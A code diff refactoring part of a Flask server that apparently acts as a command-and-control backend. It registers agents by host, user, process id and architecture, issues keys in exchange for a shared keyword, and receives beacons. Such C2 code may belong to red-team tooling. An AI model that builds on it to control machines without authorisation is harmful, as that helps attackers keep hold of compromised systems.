@@ -31,42 +31,40 @@ def strip(data):
 
 @app.route("/api/register", methods=["POST"])
 def register():
-    if request.method == "POST":
-        plaintext = strip(request.data)
+    plaintext = strip(request.data)
 
-        data = plaintext.split(",")
+    data = plaintext.split(",")
 
-        key = data[0]
+    key = data[0]
 
-        filter = {"key": key}
+    filter = {"key": key}
 
-        values = {
-            "$set": {
-                "host": data[1],
-                "user": data[2],
-                "pid": data[3],
-                "name": data[4],
-                "arch": data[5],
-                "beacon": datetime.now().strftime("%H:%M:%S"),
-            }
+    values = {
+        "$set": {
+            "host": data[1],
+            "user": data[2],
+            "pid": data[3],
+            "name": data[4],
+            "arch": data[5],
+            "beacon": datetime.now().strftime("%H:%M:%S"),
         }
+    }
 
-        agents.update_one(filter, values)
+    agents.update_one(filter, values)
 
-        return "response"
+    return "response"
 
 
 @app.route("/api/negotiate", methods=["POST"])
 def negotiate():
-    if request.method == "POST":
-        plaintext = strip(request.data)
+    plaintext = strip(request.data)
 
-        if str(plaintext) == auth.keyword:
-            id = auth.generate_id()
-            key = auth.generate_key(plaintext)
-            agents.insert_one({"id": id, "key": key})
+    if str(plaintext) == auth.keyword:
+        id = auth.generate_id()
+        key = auth.generate_key(plaintext)
+        agents.insert_one({"id": id, "key": key})
 
-            return key
+        return key
 
 
 @app.route("/api/beacon", methods=["POST"])
